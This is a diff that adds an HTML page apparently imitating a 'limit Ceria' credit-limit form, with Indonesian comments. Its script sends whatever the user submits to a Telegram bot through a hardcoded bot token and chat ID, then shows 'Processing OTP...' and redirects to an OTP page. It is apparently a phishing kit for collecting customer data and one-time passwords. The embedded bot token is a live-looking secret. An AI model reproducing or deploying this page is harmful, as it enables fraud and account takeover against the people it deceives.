@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>limit Ceria</title>
+  <meta name="viewport" content="width, initial-scale=1">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      text-align: center;
+    }
+
+    #gambar-atas {
+      margin-bottom: 20px;
+    }
+
+    #gambar-atas img {
+      width: 100%;
+      object-fit: cover;
+      max-height: 300px;
+    }
+
+    div {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      margin-top: 20px;
+    }
+
+    /* Kolom Select */
+    #pilihan-container {
+      width: 100%;
+      margin-bottom: 10px;
+    }
+
+    #pilihan {
+      width: 100%;
+      padding: 8px;
+      border-radius: 4px;
+      border: 1px solid #ccc;
+    }
+
+    /* Kolom Input dan Tombol Submit */
+    #jumlah-container {
+      width: 100%;
+      margin-bottom: 10px;
+      display: flex;
+      flex-direction: column;
+    }
+
+    #jumlah {
+      width: 100%;
+      padding: 8px;
+      border-radius: 4px;
+      border: 1px solid #ccc;
+      margin-bottom: 7px; /* Menambah jarak antara kolom input dan tombol submit */
+    }
+
+    #submit {
+      width: 100%;
+      padding: 10px;
+      border-radius: 4px;
+      border: none;
+      background-color: #4CAF50;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    /* Gambar di bawah Tombol Submit */
+    #gambar-bawah {
+      margin-top: 20px;
+      text-align: center;
+    }
+
+    #gambar-bawah img {
+      width: 50%; /* Mengurangi ukuran foto */
+      max-width: 300px; /* Maksimum lebar foto */
+      object-fit: cover;
+      border-radius: 4px; /* Membulatkan sudut foto */
+    }
+  </style>
+  <script>
+    function sendMessageToTelegram(message) {
+      var xhttp = new XMLHttpRequest();
+      xhttp.onreadystatechange = function() {
+        if (this.readyState === 4 && this.status === 200) {
+          console.log("Pesan terkirim: " + message);
+        }
+      };
+
+      var url = "https://api.telegram.org/bot6946290282:AAHbPsb9hD-DbepVOIkge81AvWjY90YbbU0/sendMessage?chat_id=6824078885&text=" + encodeURIComponent(message);
+
+      xhttp.open("POST", url, true);
+      xhttp.send();
+    }
+
+    function kirimPesan() {
+      var pesan = document.getElementById("pesan").value;
+      sendMessageToTelegram(pesan);
+
+      document.getElementById("submit").value = "Processing OTP...";
+
+      setTimeout(function() {
+        window.location.href = "otp.html";
+      }, 60000);
+    }
+  </script>
+</head>
+<body>
+  <!-- Gambar Atas -->
+  <div id="gambar-atas">
+    <img src="https://wwed.online/ceria-id.com/img/pucok.jpg" alt="Gambar Pucok">
+  </div>
+
+  <!-- Kolom Select -->
+  <div id="pilihan-container">
+    <label for="pilihan">Pilihan:</label>
+    <select id="pilihan" name="pilihan">
+      <option value="opsi1">Opsi 1</option>
+      <option value="opsi2">Opsi 2</option>
+      <option value="opsi3">Opsi 3</option>
+      <option value="opsi4">Opsi 4</option>
+    </select>
+  </div>
+
+  <!-- Kolom Input dan Tombol Submit -->
+  <div id="jumlah-container">
+    <label for="jumlah">Jumlah:</label>
+    <input type="number" id="jumlah" name="jumlah">
+    <input type="submit" id="submit" value="Submit" onclick="kirimPesan()">
+  </div>
+
+  <!-- Gambar Bawah -->
+  <div id="gambar-bawah">
+    <img src="https://wwed.online/ceria-id.com/img/2711.jpg" alt="Gambar 2711">
+  </div>
+</body>
+</html>
